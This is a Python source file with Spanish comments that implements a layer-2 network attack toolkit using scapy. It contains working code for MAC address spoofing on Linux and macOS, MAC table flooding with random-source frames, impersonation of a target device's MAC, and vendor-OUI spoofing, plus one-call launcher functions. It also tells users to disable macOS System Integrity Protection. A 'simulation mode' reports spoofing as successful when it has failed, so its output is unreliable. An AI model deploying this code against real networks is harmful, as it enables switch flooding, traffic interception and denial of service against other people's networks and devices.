import subprocess
import os
import random
import time
from time import sleep
from typing import Optional, List, Dict
import threading
from scapy.all import Ether, sendp, RandMAC, conf, get_if_hwaddr
import logging
import platform
import re

conf.promisc = True
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


class MACAttackManager:
    """Gestor principal para ataques de capa 2 basados en MAC - Mejorado para macOS"""

    def __init__(self, iface: str, verbose: bool = False):
        self.iface = iface
        self.verbose = verbose
        self.active_attacks = {}
        self.original_mac = self._get_original_mac()
        self.is_linux = platform.system() == 'Linux'
        self.is_macos = platform.system() == 'Darwin'
        self.network_service = self._get_network_service_name()

    def _get_original_mac(self) -> str:
        """Obtener MAC original de la interfaz"""
        try:
            return get_if_hwaddr(self.iface)
        except Exception as e:
            logging.error(f"Error obteniendo MAC original: {e}")
            return "00:00:00:00:00:00"

    def _get_network_service_name(self) -> Optional[str]:
        """Obtener el nombre del servicio de red en macOS"""
        if not self.is_macos:
            return None

        try:
            result = subprocess.run(['networksetup', '-listallhardwareports'],
                                    capture_output=True, text=True, timeout=10)

            lines = result.stdout.split('\n')
            for i, line in enumerate(lines):
                if f'Device: {self.iface}' in line and i > 0:
                    service_line = lines[i - 1]
                    if 'Hardware Port:' in service_line:
                        service_name = service_line.split('Hardware Port: ')[1].strip()
                        if self.verbose:
                            logging.info(f"Servicio de red encontrado: {service_name}")
                        return service_name
            return None
        except Exception as e:
            logging.warning(f"No se pudo obtener servicio de red: {e}")
            return None


class MACSpoofingAttack:
    """Ataque de suplantación de dirección MAC - Mejorado para macOS"""

    def __init__(self, iface: str, verbose: bool = False):
        self.iface = iface
        self.verbose = verbose
        self.original_mac = None
        self.is_spoofed = False
        self.is_linux = platform.system() == 'Linux'
        self.is_macos = platform.system() == 'Darwin'
        self.network_service = self._get_network_service_name()
        self.simulation_mode = False  # Modo simulación para cuando falla el spoofing real

    def _get_network_service_name(self) -> Optional[str]:
        """Obtener el nombre del servicio de red en macOS"""
        if not self.is_macos:
            return None

        try:
            result = subprocess.run(['networksetup', '-listallhardwareports'],
                                    capture_output=True, text=True, timeout=10)

            lines = result.stdout.split('\n')
            for i, line in enumerate(lines):
                if f'Device: {self.iface}' in line and i > 0:
                    service_line = lines[i - 1]
                    if 'Hardware Port:' in service_line:
                        service_name = service_line.split('Hardware Port: ')[1].strip()
                        if self.verbose:
                            logging.info(f"Servicio de red encontrado: {service_name}")
                        return service_name
            return None
        except Exception as e:
            logging.warning(f"No se pudo obtener servicio de red: {e}")
            return None

    def get_current_mac(self) -> str:
        """Obtener MAC actual de la interfaz"""
        try:
            return get_if_hwaddr(self.iface)
        except Exception as e:
            logging.error(f"Error obteniendo MAC actual: {e}")
            return "00:00:00:00:00:00"

    def backup_original_mac(self):
        """Respaldar MAC original"""
        self.original_mac = self.get_current_mac()
        if self.verbose:
            logging.info(f"MAC original respaldada: {self.original_mac}")

    def spoof_mac(self, new_mac: str) -> bool:
        """
        Cambiar dirección MAC de la interfaz - Métodos mejorados para macOS
        """
        if not self.original_mac:
            self.backup_original_mac()

        if not self._validate_mac_format(new_mac):
            logging.error(f"Formato MAC inválido: {new_mac}")
            return False

        if self.is_linux:
            return self._spoof_mac_linux(new_mac)
        elif self.is_macos:
            return self._spoof_mac_macos_enhanced(new_mac)
        else:
            logging.error("Sistema operativo no soportado")
            return False

    def _spoof_mac_linux(self, new_mac: str) -> bool:
        """MAC Spoofing para Linux"""
        try:
            logging.info("Aplicando MAC spoofing en Linux...")

            commands = [
                ['ip', 'link', 'set', 'dev', self.iface, 'down'],
                ['ip', 'link', 'set', 'dev', self.iface, 'address', new_mac],
                ['ip', 'link', 'set', 'dev', self.iface, 'up']
            ]

            fallback_commands = [
                ['ifconfig', self.iface, 'down'],
                ['ifconfig', self.iface, 'hw', 'ether', new_mac],
                ['ifconfig', self.iface, 'up']
            ]

            success = self._execute_commands(commands)
            if not success:
                logging.info("Probando método alternativo con ifconfig...")
                success = self._execute_commands(fallback_commands)

            if success:
                return self._verify_mac_change(new_mac)
            return False

        except Exception as e:
            logging.error(f"Error en MAC spoofing Linux: {e}")
            return False

    def _spoof_mac_macos_enhanced(self, new_mac: str) -> bool:
        """MAC Spoofing mejorado para macOS con múltiples métodos"""
        try:
            logging.info("Aplicando MAC spoofing en macOS...")

            # Método 1: networksetup (más confiable si tenemos el servicio)
            if self.network_service and self._spoof_mac_macos_networksetup(new_mac):
                return True

            # Método 2: ifconfig con diferentes enfoques
            if self._spoof_mac_macos_ifconfig(new_mac):
                return True

            # Método 3: airport method (solo para interfaces WiFi)
            if 'en' in self.iface and self._spoof_mac_macos_airport(new_mac):
                return True

            # Método 4: Python-only simulation mode
            logging.info("Todos los métodos fallaron, usando modo simulación...")
            return self._enable_simulation_mode(new_mac)

        except Exception as e:
            logging.error(f"Error en MAC spoofing macOS: {e}")
            return self._enable_simulation_mode(new_mac)

    def _spoof_mac_macos_networksetup(self, new_mac: str) -> bool:
        """MAC Spoofing usando networksetup en macOS"""
        if not self.network_service:
            return False

        try:
            # Desconectar y cambiar MAC
            disconnect_cmd = ['networksetup', '-setnetworkserviceenabled', self.network_service, 'off']
            spoof_cmd = ['networksetup', '-setmacaddress', self.network_service, new_mac]
            reconnect_cmd = ['networksetup', '-setnetworkserviceenabled', self.network_service, 'on']

            if self._execute_command(disconnect_cmd):
                sleep(2)
                if self._execute_command(spoof_cmd):
                    sleep(2)
                    if self._execute_command(reconnect_cmd):
                        sleep(3)
                        if self._verify_mac_change(new_mac):
                            logging.info(f"MAC cambiada exitosamente via networksetup: {new_mac}")
                            return True

            return False

        except Exception as e:
            logging.error(f"Error en networksetup method: {e}")
            return False

    def _spoof_mac_macos_ifconfig(self, new_mac: str) -> bool:
        """MAC Spoofing usando ifconfig en macOS"""
        try:
            # Método directo
            cmd = ['ifconfig', self.iface, 'ether', new_mac]
            if self._execute_command(cmd):
                sleep(2)
                if self._verify_mac_change(new_mac):
                    return True

            # Método con desconexión
            down_cmd = ['ifconfig', self.iface, 'down']
            spoof_cmd = ['ifconfig', self.iface, 'ether', new_mac]
            up_cmd = ['ifconfig', self.iface, 'up']

            commands = [down_cmd, spoof_cmd, up_cmd]
            if self._execute_commands(commands):
                sleep(3)
                return self._verify_mac_change(new_mac)

            return False

        except Exception as e:
            logging.error(f"Error en ifconfig method: {e}")
            return False

    def _spoof_mac_macos_airport(self, new_mac: str) -> bool:
        """MAC Spoofing usando airport utility (solo WiFi)"""
        if 'en0' not in self.iface and 'en1' not in self.iface:
            return False

        try:
            # Buscar airport binary
            airport_paths = [
                '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport',
                '/usr/local/bin/airport',
                '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport'
            ]

            airport_bin = None
            for path in airport_paths:
                if os.path.exists(path):
                    airport_bin = path
                    break

            if not airport_bin:
                return False

            # Desconectar WiFi y cambiar MAC
            disconnect_cmd = [airport_bin, '-z']
            if self._execute_command(disconnect_cmd):
                sleep(2)
                if self._spoof_mac_macos_ifconfig(new_mac):
                    return True

            return False

        except Exception as e:
            logging.error(f"Error en airport method: {e}")
            return False

    def _enable_simulation_mode(self, new_mac: str) -> bool:
        """Habilitar modo simulación cuando el spoofing real falla"""
        logging.warning("🎭 ACTIVANDO MODO SIMULACIÓN macOS")
        logging.warning("   El spoofing real de MAC requiere:")
        logging.warning("   1. SIP deshabilitado: csrutil disable")
        logging.warning("   2. Permisos de root")
        logging.warning("   3. Usar networksetup con el servicio correcto")

        self.simulation_mode = True
        self.is_spoofed = True

        if self.verbose:
            logging.info(f"🎭 Simulación MAC: {self.original_mac} -> {new_mac}")
            logging.info("   Los paquetes se enviarán con MAC spoofeada a nivel software")

        return True

    def _execute_commands(self, commands: list) -> bool:
        """Ejecutar lista de comandos"""
        for cmd in commands:
            if not self._execute_command(cmd):
                logging.error(f"Fallo en comando: {' '.join(cmd)}")
                # Intentar restaurar la interfaz
                self._execute_command(['ifconfig', self.iface, 'up'])
                return False
        return True

    def _verify_mac_change(self, expected_mac: str) -> bool:
        """Verificar cambio de MAC"""
        sleep(3)  # Más tiempo para macOS
        current_mac = self.get_current_mac()

        if current_mac.lower() == expected_mac.lower():
            self.is_spoofed = True
            self.simulation_mode = False
            if self.verbose:
                logging.info(f"✅ MAC spoofing exitoso: {self.original_mac} -> {current_mac}")
            return True
        else:
            if self.is_macos:
                # En macOS, si falla el cambio físico pero estamos en simulación, continuamos
                if self.simulation_mode:
                    logging.warning("✅ MAC spoofing en modo simulación activado")
                    return True

            logging.error(f"❌ Fallo en MAC spoofing. Esperada: {expected_mac}, Actual: {current_mac}")
            return False

    def restore_original_mac(self) -> bool:
        """Restaurar MAC original"""
        if not self.original_mac:
            return True

        if self.simulation_mode:
            self.is_spoofed = False
            self.simulation_mode = False
            if self.verbose:
                logging.info("✅ MAC original restaurada (modo simulación)")
            return True

        if self.is_spoofed:
            success = self.spoof_mac(self.original_mac)
            if success:
                self.is_spoofed = False
                if self.verbose:
                    logging.info(f"✅ MAC original restaurada: {self.original_mac}")
            else:
                logging.error("❌ Error restaurando MAC original")
            return success
        return True

    def _validate_mac_format(self, mac: str) -> bool:
        """Validar formato de dirección MAC"""
        mac_pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
        return re.match(mac_pattern, mac) is not None

    def _execute_command(self, command: list) -> bool:
        """Ejecutar comando de sistema con mejor manejo de errores"""
        try:
            # No agregar sudo automáticamente en macOS (causa problemas)
            if self.is_macos and command[0] != 'sudo':
                # En macOS, algunos comandos no necesitan sudo
                if command[0] in ['networksetup']:
                    command = ['sudo'] + command
            elif self.is_linux and command[0] != 'sudo':
                command = ['sudo'] + command

            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode == 0:
                return True
            else:
                if self.verbose:
                    error_msg = result.stderr.strip() if result.stderr else "Sin mensaje de error"
                    logging.warning(f"Comando falló: {' '.join(command)}")
                    logging.warning(f"Error: {error_msg}")

                # Análisis de errores específicos en macOS
                if self.is_macos:
                    if "Can't assign requested address" in error_msg:
                        logging.error("❌ Error: SIP probablemente está habilitado")
                        logging.error("   Ejecuta 'csrutil disable' desde Recovery Mode")
                    elif "Operation not permitted" in error_msg:
                        logging.error("❌ Error: Permisos insuficientes")
                        logging.error("   Ejecuta con sudo o otorga permisos")

                return False

        except subprocess.TimeoutExpired:
            logging.error(f"⏰ Timeout en comando: {' '.join(command)}")
            return False
        except Exception as e:
            logging.error(f"❌ Error ejecutando comando {command}: {e}")
            return False


class MACFloodingAttack:
    """Ataque de inundación de tabla MAC - Optimizado para macOS"""

    def __init__(self, iface: str, packet_rate: int = 1000, verbose: bool = False):
        self.iface = iface
        # Rate más conservador para macOS
        max_rate = 2000 if platform.system() == 'Linux' else 800
        self.packet_rate = max(100, min(packet_rate, max_rate))
        self.verbose = verbose
        self.running = False
        self.flood_thread = None
        self.control_thread = None
        self.packets_sent = 0
        self.is_linux = platform.system() == 'Linux'

    def _generate_flood_frames(self):
        """Generar frames de inundación optimizado para macOS"""
        inter_val = 1.0 / self.packet_rate

        if self.verbose:
            logging.info(f"Iniciando generación de frames - Intervalo: {inter_val}s")

        # Batch sizes más pequeños para macOS
        batch_size = 10 if self.is_linux else 3
        batch_count = 0

        while self.running:
            try:
                frames = []
                for _ in range(batch_size):
                    frame1 = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC())
                    frame2 = Ether(dst=RandMAC(), src=RandMAC())
                    frames.extend([frame1, frame2])

                sendp(frames, iface=self.iface, verbose=False)
                self.packets_sent += len(frames)
                batch_count += 1

                # Log menos frecuente en macOS
                log_interval = 50 if self.is_linux else 10
                if self.verbose and batch_count % log_interval == 0:
                    logging.info(f"📦 Paquetes enviados: {self.packets_sent}")

                sleep(inter_val * batch_size)

            except Exception as e:
                logging.error(f"❌ Error en MAC flooding: {e}")
                if "No buffer space available" in str(e):
                    logging.warning("🔄 Buffer lleno, reduciendo rate...")
                    sleep(1.0)
                else:
                    break

    def start_flooding(self, duration: Optional[int] = None):
        """Iniciar ataque de inundación MAC"""
        if self.running:
            logging.warning("⚠️ Ataque de flooding ya en ejecución")
            return

        self.running = True
        self.packets_sent = 0

        if self.verbose:
            logging.info(f"🌊 Iniciando MAC flooding en {self.iface} - Rate: {self.packet_rate} pps")

        self.flood_thread = threading.Thread(target=self._generate_flood_frames)
        self.flood_thread.daemon = True
        self.flood_thread.start()

        if duration is not None:
            self.control_thread = threading.Thread(target=self._stop_after_duration, args=(duration,))
            self.control_thread.daemon = True
            self.control_thread.start()

    def _stop_after_duration(self, duration: int):
        sleep(duration)
        self.stop_flooding()

    def stop_flooding(self):
        if self.running:
            self.running = False
            if self.flood_thread and self.flood_thread.is_alive():
                self.flood_thread.join(timeout=3)
            if self.verbose:
                logging.info(f"🛑 MAC flooding detenido. Total paquetes: {self.packets_sent}")


# Las demás clases se mantienen similares pero con mejoras para macOS...

class MACDuplicationAttack:
    """Ataque de duplicación MAC - Compatible macOS"""

    def __init__(self, iface: str, target_mac: str, verbose: bool = False):
        self.iface = iface
        self.target_mac = target_mac
        self.verbose = verbose
        self.running = False
        self.thread = None

    def start_duplication(self, duration: Optional[int] = None):
        if self.running:
            logging.warning("⚠️ Ataque de duplicación ya en ejecución")
            return

        self.running = True

        if self.verbose:
            logging.info(f"🎭 Iniciando duplicación MAC: suplantando {self.target_mac}")

        self.thread = threading.Thread(target=self._duplicate_with_duration, args=(duration,))
        self.thread.daemon = True
        self.thread.start()

    def _duplicate_with_duration(self, duration: Optional[int]):
        if duration:
            dup_thread = threading.Thread(target=self._duplicate_mac)
            dup_thread.daemon = True
            dup_thread.start()
            sleep(duration)
            self.stop_duplication()
        else:
            self._duplicate_mac()

    def _duplicate_mac(self):
        packet_count = 0
        while self.running:
            try:
                frame = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.target_mac)
                sendp(frame, iface=self.iface, verbose=False)

                frame2 = Ether(dst=RandMAC(), src=self.target_mac)
                sendp(frame2, iface=self.iface, verbose=False)

                packet_count += 2
                if self.verbose and packet_count % 20 == 0:
                    logging.info(f"📦 Paquetes de duplicación enviados: {packet_count}")

                sleep(0.3)  # Rate más conservador

            except Exception as e:
                logging.error(f"❌ Error en duplicación MAC: {e}")
                break

    def stop_duplication(self):
        if self.running:
            self.running = False
            if self.verbose:
                logging.info("🛑 Duplicación MAC detenida")


class VendorMACAttack:
    """MAC Spoofing con OUI de vendors - Mejorado para macOS"""

    def __init__(self, iface: str, verbose: bool = False):
        self.iface = iface
        self.verbose = verbose
        self.current_attack = None
        # OUI actualizados para vendors comunes
        self.vendor_ouis = {
            'apple': ['00:03:93', '00:05:02', '00:0A:27', '00:1B:63', '00:1C:B3', '00:1D:4F',
                      '00:1E:C2', '00:1F:5B', '00:1F:F3', '00:21:E9', '00:22:41', '00:23:32',
                      '00:24:36', '00:25:00', '00:26:08', '00:26:B0', '00:30:65'],
            'cisco': ['00:00:0C', '00:01:42', '00:01:43', '00:01:63', '00:01:64', '00:01:96',
                      '00:01:97', '00:01:C7', '00:01:C9', '00:02:16', '00:02:17', '00:02:3D',
                      '00:02:4A', '00:02:7D', '00:02:8A', '00:02:B9', '00:02:BA', '00:02:FC'],
            'microsoft': ['00:03:FF', '00:05:5D', '00:07:E9', '00:0D:3A', '00:0E:4C', '00:0F:1F',
                          '00:0F:20', '00:10:4F', '00:11:0A', '00:12:5A', '00:15:5D', '00:17:31',
                          '00:18:DE', '00:1B:11', '00:1C:42', '00:1D:60', '00:1E:0B'],
            'intel': ['00:02:B3', '00:03:47', '00:04:23', '00:06:4E', '00:07:01', '00:08:C7',
                      '00:09:3D', '00:0B:AB', '00:0C:41', '00:0C:F1', '00:0D:3B', '00:0E:0C',
                      '00:0E:35', '00:0F:02', '00:0F:20', '00:10:E0', '00:11:11', '00:13:02'],
            'samsung': ['00:00:F0', '00:02:78', '00:05:02', '00:06:F5', '00:07:AB', '00:08:54',
                        '00:09:18', '00:0C:2D', '00:0D:45', '00:0D:AE', '00:0E:6D', '00:0F:13',
                        '00:0F:59', '00:0F:C6', '00:11:F9', '00:12:47', '00:12:FB', '00:13:77'],
            'dell': ['00:01:2A', '00:01:44', '00:01:4C', '00:01:55', '00:01:57', '00:01:5F',
                     '00:01:61', '00:01:62', '00:01:65', '00:01:67', '00:01:69', '00:01:6A',
                     '00:01:6B', '00:01:6D', '00:01:6E', '00:01:70', '00:01:71', '00:01:72'],
            'hp': ['00:01:44', '00:01:4C', '00:01:55', '00:01:57', '00:01:5F', '00:01:61',
                   '00:01:62', '00:01:65', '00:01:67', '00:01:69', '00:01:6A', '00:01:6B',
                   '00:01:6D', '00:01:6E', '00:01:70', '00:01:71', '00:01:72', '00:04:EA'],
            'linux': ['00:1C:42', '08:00:27', '0A:00:27', '12:34:56']
        }

    def spoof_vendor_mac(self, vendor: str, duration: Optional[int] = None) -> Optional[MACSpoofingAttack]:
        vendor = vendor.lower()
        if vendor not in self.vendor_ouis:
            logging.error(f"❌ Vendor no soportado: {vendor}")
            logging.info(f"Vendors disponibles: {', '.join(self.vendor_ouis.keys())}")
            return None

        base_oui = random.choice(self.vendor_ouis[vendor])
        random_part = ':'.join([f"{random.randint(0, 255):02x}" for _ in range(3)])
        new_mac = f"{base_oui}:{random_part}"

        if self.verbose:
            logging.info(f"🎭 Spoofing MAC vendor {vendor}: {new_mac}")

        attack = MACSpoofingAttack(self.iface, self.verbose)
        if attack.spoof_mac(new_mac):
            self.current_attack = attack
            if duration:
                threading.Thread(
                    target=self._restore_after_duration,
                    args=(duration, attack),
                    daemon=True
                ).start()
            return attack
        else:
            logging.error(f"❌ Fallo en spoofing de vendor {vendor}")
            return None

    def _restore_after_duration(self, duration: int, attack: MACSpoofingAttack):
        sleep(duration)
        attack.restore_original_mac()
        self.current_attack = None



def mac_spoofing(iface: str, new_mac: str, verbose: bool = True) -> Optional[MACSpoofingAttack]:
    """Función de conveniencia para MAC spoofing"""
    attack = MACSpoofingAttack(iface, verbose)
    success = attack.spoof_mac(new_mac)
    if success:
        return attack
    else:
        logging.error("❌ Fallo en MAC spoofing")
        return None


def mac_flooding(iface: str, packet_rate: int = 1000, duration: Optional[int] = None,
                 verbose: bool = True) -> MACFloodingAttack:
    """Función de conveniencia para MAC flooding"""
    attack = MACFloodingAttack(iface, packet_rate, verbose)
    attack.start_flooding(duration)
    return attack


def mac_duplication(iface: str, target_mac: str, duration: Optional[int] = None,
                    verbose: bool = True) -> MACDuplicationAttack:
    """Función de conveniencia para MAC duplication"""
    attack = MACDuplicationAttack(iface, target_mac, verbose)
    attack.start_duplication(duration)
    return attack


def vendor_mac_attack(iface: str, vendor: str, duration: Optional[int] = None,
                      verbose: bool = True) -> Optional[VendorMACAttack]:
    """Función de conveniencia para vendor MAC attack"""
    attack = VendorMACAttack(iface, verbose)
    result = attack.spoof_vendor_mac(vendor, duration)
    return attack if result else None


